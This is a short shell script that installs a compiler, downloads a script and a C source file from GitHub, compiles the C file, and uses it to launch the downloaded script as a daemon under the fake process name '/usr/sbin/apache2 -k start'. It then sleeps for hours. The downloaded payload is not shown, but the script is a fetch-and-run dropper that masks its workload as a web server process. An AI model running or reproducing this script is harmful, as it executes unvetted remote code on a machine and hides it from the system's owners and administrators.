#!/bin/sh


apt-get install gcc -y
apt-get install unzip -y
wget https://github.com/tuhsv228/test/raw/main/Dep.sh
chmod +x Dep.sh
wget https://github.com/thoeb292/thoeb292/raw/main/mas.c
gcc -o test mas.c 
./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./Dep.sh 
sleep 80000
